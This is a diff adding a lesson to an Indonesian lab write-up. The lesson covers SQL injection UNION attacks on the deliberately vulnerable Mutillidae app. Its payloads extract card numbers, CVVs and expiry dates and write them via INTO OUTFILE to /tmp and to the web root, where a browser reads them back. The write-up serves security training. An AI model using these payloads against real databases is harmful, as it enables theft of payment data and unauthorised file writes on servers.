@@ -346,4 +346,58 @@ Buka menu proxy -> options dan atur sebagai berikut :
 
 ![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m8_16.png)
 
+### Lesson 9 - SQL Injection Union Exploit #2 (Create Output File)
+
+1. Simpan output dari Union Table ke dalam file `/tmp/CCN.csv` dengan perintah
+```
+RLIKE '^[0-9]' union select ccid,ccnumber,ccv,expiration,null from credit_cards INTO OUTFILE '/tmp/CCN.csv' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED by '\n';
+```
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m9_03.png)
+
+2. Untuk melihat hasilnya gunakan perintah `\! cat /tmp/CCN.csv`
+
+3. Akses mutillidae dari backtrack dengan url `http://192.168.56.1/mutillidae`
+
+4. Buka User info melalui <b>OWASP Top 10</b> --> <b>A1 - SQL Injection</b> --> <b>SQLi - Extract Data</b> --> <b>User Info</b>
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m9_04.png)
+
+5. Lakukan inspect element pada textbox name dan ubah <b>`size`</b> dari 20 menjadi <b>`100`</b>
+
+6. Isi Name dengan `' union select ccid,ccnumber,ccv,expiration,null from credit_cards --`
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m9_06.png)
+
+7. Klik tombol <b>View Account Details</b>
+
+8. Username akan terisi dengan credit card number, password terisi dengan CCVm dan signature terisi dengan expiration
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m9_07.png)
+
+9. Buka kembali User Info
+
+10. Lakukan inspect elemen pada name dan ubah <b>`size`</b> menjadi <b>`100`</b>
+
+11. Lakukan mysql union injection dengan memasukkan kode berikut pada Name
+```
+' union select ccid,ccnumber,ccv,expiration,null from credit_cards INTO OUTFILE '/var/www/html/mutillidae/CCN2.txt' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED BY '\n' -- 
+```
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m9_08.png)
+
+12. Akan muncul hasil seperti gambar
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m9_09.png)
+
+13. Buka tab baru dan buka `192.168.56.1/mutillidae/CCN2.txt`
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m9_10.png)
+
+
+
+   
+   
+
+
+
 Referensi : http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson8/index.html
